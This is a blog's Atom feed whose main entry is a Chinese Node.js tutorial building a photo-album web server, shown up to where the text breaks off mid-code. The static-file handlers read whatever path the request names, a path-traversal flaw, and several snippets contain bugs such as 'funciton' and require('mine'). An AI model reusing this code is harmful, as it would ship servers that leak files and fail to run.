<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Honey Young</title>
  
  <subtitle>小杨鹤</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-01T07:20:46.208Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>honey young</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>个人技能</title>
    <link href="http://yoursite.com/2018/05/23/%E4%B8%AA%E4%BA%BA%E6%A0%87%E7%AD%BE/"/>
    <id>http://yoursite.com/2018/05/23/个人标签/</id>
    <published>2018-05-23T07:23:29.000Z</published>
    <updated>2018-06-01T07:20:46.208Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="个人技能" scheme="http://yoursite.com/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E8%83%BD/"/>
    
    
      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
    
      <category term="CSS3" scheme="http://yoursite.com/tags/CSS3/"/>
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
      <category term="Ajax" scheme="http://yoursite.com/tags/Ajax/"/>
    
      <category term="AngularJS" scheme="http://yoursite.com/tags/AngularJS/"/>
    
      <category term="BOM" scheme="http://yoursite.com/tags/BOM/"/>
    
      <category term="Bower" scheme="http://yoursite.com/tags/Bower/"/>
    
      <category term="Cookie" scheme="http://yoursite.com/tags/Cookie/"/>
    
      <category term="DOM" scheme="http://yoursite.com/tags/DOM/"/>
    
      <category term="EJS" scheme="http://yoursite.com/tags/EJS/"/>
    
      <category term="Express" scheme="http://yoursite.com/tags/Express/"/>
    
      <category term="Gulp" scheme="http://yoursite.com/tags/Gulp/"/>
    
      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
    
      <category term="HTML5" scheme="http://yoursite.com/tags/HTML5/"/>
    
      <category term="JSON" scheme="http://yoursite.com/tags/JSON/"/>
    
      <category term="MongoDB" scheme="http://yoursite.com/tags/MongoDB/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="React" scheme="http://yoursite.com/tags/React/"/>
    
      <category term="RequireJS" scheme="http://yoursite.com/tags/RequireJS/"/>
    
      <category term="SeaJs" scheme="http://yoursite.com/tags/SeaJs/"/>
    
      <category term="Session" scheme="http://yoursite.com/tags/Session/"/>
    
      <category term="Underscore" scheme="http://yoursite.com/tags/Underscore/"/>
    
      <category term="browser" scheme="http://yoursite.com/tags/browser/"/>
    
      <category term="canvas" scheme="http://yoursite.com/tags/canvas/"/>
    
      <category term="cordova" scheme="http://yoursite.com/tags/cordova/"/>
    
      <category term="eCharts" scheme="http://yoursite.com/tags/eCharts/"/>
    
      <category term="git" scheme="http://yoursite.com/tags/git/"/>
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
      <category term="ionic" scheme="http://yoursite.com/tags/ionic/"/>
    
      <category term="jQuery" scheme="http://yoursite.com/tags/jQuery/"/>
    
      <category term="Grunt" scheme="http://yoursite.com/tags/Grunt/"/>
    
      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
    
      <category term="mine" scheme="http://yoursite.com/tags/mine/"/>
    
      <category term="net" scheme="http://yoursite.com/tags/net/"/>
    
      <category term="network" scheme="http://yoursite.com/tags/network/"/>
    
      <category term="npm" scheme="http://yoursite.com/tags/npm/"/>
    
      <category term="nrm" scheme="http://yoursite.com/tags/nrm/"/>
    
      <category term="nvm" scheme="http://yoursite.com/tags/nvm/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
      <category term="webpack" scheme="http://yoursite.com/tags/webpack/"/>
    
      <category term="artTemplate" scheme="http://yoursite.com/tags/artTemplate/"/>
    
      <category term="ps" scheme="http://yoursite.com/tags/ps/"/>
    
      <category term="sublime" scheme="http://yoursite.com/tags/sublime/"/>
    
      <category term="webstorm" scheme="http://yoursite.com/tags/webstorm/"/>
    
      <category term="vs code" scheme="http://yoursite.com/tags/vs-code/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="eclipse" scheme="http://yoursite.com/tags/eclipse/"/>
    
      <category term="命令行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
      <category term="小项目" scheme="http://yoursite.com/tags/%E5%B0%8F%E9%A1%B9%E7%9B%AE/"/>
    
      <category term="库" scheme="http://yoursite.com/tags/%E5%BA%93/"/>
    
      <category term="性能优化" scheme="http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
      <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="框架" scheme="http://yoursite.com/tags/%E6%A1%86%E6%9E%B6/"/>
    
      <category term="模块化" scheme="http://yoursite.com/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
      <category term="正则" scheme="http://yoursite.com/tags/%E6%AD%A3%E5%88%99/"/>
    
      <category term="表单" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95/"/>
    
      <category term="面向对象" scheme="http://yoursite.com/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="交互" scheme="http://yoursite.com/tags/%E4%BA%A4%E4%BA%92/"/>
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Node-http-网站</title>
    <link href="http://yoursite.com/2017/01/26/Node-%E7%9B%B8%E5%86%8C%E5%B0%8F%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://yoursite.com/2017/01/26/Node-相册小项目（上）/</id>
    <published>2017-01-25T16:00:00.000Z</published>
    <updated>2018-06-06T06:55:52.599Z</updated>
    
    <content type="html"><![CDATA[<p>完成相册新建、上传图片等简单的功能小项目。</p><h2 id="项目初始化"><a href="#项目初始化" class="headerlink" title="项目初始化"></a>项目初始化</h2><ol><li>把前端用到的静态资源放到 <code>public</code> 目录下</li><li>把所有的页面都放到 <code>views</code> 目录下</li><li>在项目根路径下创建一个 <code>app.js</code> 作为后台的启动入口</li><li>使用 npm 安装和管理项目的依赖项</li><li>将所有的相册放到项目根路径下的 <code>uploads</code>目录小</li></ol><h2 id="划分哪些资源公共开放"><a href="#划分哪些资源公共开放" class="headerlink" title="划分哪些资源公共开放"></a>划分哪些资源公共开放</h2><a id="more"></a><ul><li>public<ul><li>css</li><li>js</li><li>img</li></ul></li><li>uploads</li><li>node_modules</li></ul><h2 id="设计路由"><a href="#设计路由" class="headerlink" title="设计路由"></a>设计路由</h2><table><thead><tr><th>请求方法</th><th style="text-align:right">请求路径</th><th style="text-align:center">响应处理</th></tr></thead><tbody><tr><td>GET</td><td style="text-align:right">/</td><td style="text-align:center">views/index.html</td></tr><tr><td>GET</td><td style="text-align:right">/album</td><td style="text-align:center">views/album.html</td></tr><tr><td>GET</td><td style="text-align:right">/album/add</td><td style="text-align:center">处理添加相册请求</td></tr><tr><td>POST</td><td style="text-align:right">/upload</td><td style="text-align:center">处理照片上传请求</td></tr></tbody></table><h2 id="处理相册静态资源"><a href="#处理相册静态资源" class="headerlink" title="处理相册静态资源"></a>处理相册静态资源</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">const</span> mime = <span class="built_in">require</span>(<span class="string">'mime'</span>);</span><br><span class="line">http</span><br><span class="line">  .createServer()</span><br><span class="line">  .on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 指定第二个参数，parse 方法会将查询字符串解析为一个对象挂载给返回结果的 query 属性</span></span><br><span class="line">    <span class="comment">// 该方法，会将一个完整的 url 路径解析为一个对象，方便我们取各个部分的数据</span></span><br><span class="line">    <span class="keyword">const</span> urlObj = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> pathname = urlObj.pathname; <span class="comment">// 拿到请求路径，不包含查询字符串</span></span><br><span class="line">    <span class="keyword">const</span> queryObj = urlObj.query; <span class="comment">// 拿到通过 url.parse 方法解析出来的查询字符串（已经自动转为对象了）</span></span><br><span class="line">    <span class="keyword">if</span> (pathname === <span class="string">'/'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./views/index.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname.startsWith(<span class="string">'/public/'</span>) || pathname.startsWith(<span class="string">'/uploads/'</span>) || pathname.startsWith(<span class="string">'/node_modules/'</span>)) &#123;</span><br><span class="line">      fs.readFile(<span class="string">`.<span class="subst">$&#123;pathname&#125;</span>`</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          res.writeHead(<span class="number">404</span>, <span class="string">'Not Found'</span>);</span><br><span class="line">          res.end();</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: mime.lookup(pathname)</span><br><span class="line">        &#125;)</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000.'</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h2 id="路由：根据不同的请求路径做处理。"><a href="#路由：根据不同的请求路径做处理。" class="headerlink" title="路由：根据不同的请求路径做处理。"></a>路由：根据不同的请求路径做处理。</h2><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">'./router'</span>);</span><br><span class="line">http</span><br><span class="line">  .createServer()</span><br><span class="line">  .on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    router(req, res);</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000.'</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>提取的路由模块</p><p>router.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">const</span> mime = <span class="built_in">require</span>(<span class="string">'mime'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = funciton(req, res) &#123;</span><br><span class="line">  <span class="keyword">const</span> urlObj = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> pathname = urlObj.pathname; </span><br><span class="line">  <span class="keyword">const</span> queryObj = urlObj.query;</span><br><span class="line">  <span class="comment">// 一个请求对应了一个处理流程代码</span></span><br><span class="line">  <span class="keyword">if</span> (pathname === <span class="string">'/'</span>) &#123;</span><br><span class="line">    fs.readFile(<span class="string">'./views/index.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">      &#125;);</span><br><span class="line">      res.end(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname.startsWith(<span class="string">'/public/'</span>) || pathname.startsWith(<span class="string">'/uploads/'</span>) || pathname.startsWith(<span class="string">'/node_modules/'</span>)) &#123;</span><br><span class="line">    fs.readFile(<span class="string">`.<span class="subst">$&#123;pathname&#125;</span>`</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        res.writeHead(<span class="number">404</span>, <span class="string">'Not Found'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">      &#125;</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: mime.lookup(pathname)</span><br><span class="line">      &#125;)</span><br><span class="line">      res.end(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="再次封装处理请求的代码-处理模块，暴漏一系列的方法"><a href="#再次封装处理请求的代码-处理模块，暴漏一系列的方法" class="headerlink" title="再次封装处理请求的代码, 处理模块，暴漏一系列的方法"></a>再次封装处理请求的代码, 处理模块，暴漏一系列的方法</h2><p>router.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">const</span> mime = <span class="built_in">require</span>(<span class="string">'mime'</span>);</span><br><span class="line"><span class="keyword">const</span> handler = <span class="built_in">require</span>(<span class="string">'./handler'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = funciton(req, res) &#123;</span><br><span class="line">  <span class="keyword">const</span> urlObj = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> pathname = urlObj.pathname; </span><br><span class="line">  <span class="keyword">const</span> queryObj = urlObj.query;</span><br><span class="line">  <span class="comment">// 一个请求对应了一个处理流程代码</span></span><br><span class="line">  <span class="keyword">if</span> (pathname === <span class="string">'/'</span>) &#123;</span><br><span class="line">    handler.showIndex(req, res);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname.startsWith(<span class="string">'/public/'</span>) || pathname.startsWith(<span class="string">'/uploads/'</span>) || pathname.startsWith(<span class="string">'/node_modules/'</span>)) &#123;</span><br><span class="line">    handler.showPublic(req, res);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hander.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 处理渲染首页</span></span><br><span class="line">exports.showIndex = <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readFile(<span class="string">'./views/index.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 处理添加相册</span></span><br><span class="line"><span class="comment">// 处理渲染相册页面</span></span><br><span class="line"><span class="comment">// 处理上传照片请求</span></span><br><span class="line"><span class="comment">// 处理静态资源请求</span></span><br><span class="line">exports.showPublic = <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readFile(<span class="string">`.<span class="subst">$&#123;req.url&#125;</span>`</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      res.writeHead(<span class="number">404</span>, <span class="string">'Not Found'</span>);</span><br><span class="line">      res.end();</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: mime.lookup(req.url)</span><br><span class="line">    &#125;)</span><br><span class="line">    res.end(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>模块清晰-职责单一</p><p>客户端 -&gt; app.js (1.启动服务器; 2. 将请求传递到 router 模块中) -&gt; router.js 路由模块 (根据不同的请求路径调用不同的处理函数) -&gt; handler.js 请求处理函数</p><h2 id="使用模板引擎"><a href="#使用模板引擎" class="headerlink" title="使用模板引擎"></a>使用模板引擎</h2><p>template.js （先看有关 underscore 模板的使用的小例子）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">'underscore'</span>);</span><br><span class="line"><span class="comment">// 1. 将模板字符串传递给 _.template 方法</span></span><br><span class="line"><span class="comment">//    该方法返回一个编译函数</span></span><br><span class="line"><span class="comment">// 2. 调用编译函数，传入要注入的数据对象</span></span><br><span class="line"><span class="keyword">const</span> complied = _.template(<span class="string">`hello &lt;%= name %&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt; </span></span><br><span class="line"><span class="string">  &lt;% fruits.forEach(function (fruit))&#123; %&gt;</span></span><br><span class="line"><span class="string">    &lt;li&gt;&lt;%= fruit %&gt;&lt;li&gt;</span></span><br><span class="line"><span class="string">  &lt;% &#125;) %&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(complied(&#123;</span><br><span class="line">  name: <span class="string">"Hiraku"</span>,</span><br><span class="line">  fruits: [</span><br><span class="line">    <span class="string">'栗子'</span>,</span><br><span class="line">    <span class="string">'苹果'</span>,</span><br><span class="line">    <span class="string">'橙子'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>现在将模板字符串利用读文件的方式读出来。(tpt.html)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">fruits.forEach</span>(<span class="attr">function</span> (<span class="attr">fruit</span>))&#123; %&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">fruit</span> %&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> &#125;) %&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在可以这样写 template.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">'underscore'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.readFile(<span class="string">'./tpl.html'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> complied = _.template(data);</span><br><span class="line">  <span class="built_in">console</span>.log(complied(&#123;</span><br><span class="line">    fruits: [</span><br><span class="line">      <span class="string">'栗子'</span>,</span><br><span class="line">      <span class="string">'苹果'</span>,</span><br><span class="line">      <span class="string">'橙子'</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="完成首页渲染相册表功能"><a href="#完成首页渲染相册表功能" class="headerlink" title="完成首页渲染相册表功能"></a>完成首页渲染相册表功能</h2><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">'./router'</span>);</span><br><span class="line">http</span><br><span class="line">  .createServer()</span><br><span class="line">  .on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    router(req, res);</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000.'</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>hander.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">'underscore'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'mine'</span>)</span><br><span class="line"><span class="comment">// 处理渲染首页</span></span><br><span class="line">exports.showIndex = <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readdir(<span class="string">'./uploads'</span>, (err, files) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(<span class="string">'./views/index.html'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> result = _.template(data)(</span><br><span class="line">        albumNames: files</span><br><span class="line">      );</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">      &#125;);</span><br><span class="line">      res.end(result);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 处理添加相册</span></span><br><span class="line"><span class="comment">// 处理渲染相册页面</span></span><br><span class="line"><span class="comment">// 处理上传照片请求</span></span><br><span class="line"><span class="comment">// 处理静态资源请求</span></span><br><span class="line">exports.showPublic = <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.readFile(<span class="string">`.<span class="subst">$&#123;req.url&#125;</span>`</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      res.writeHead(<span class="number">404</span>, <span 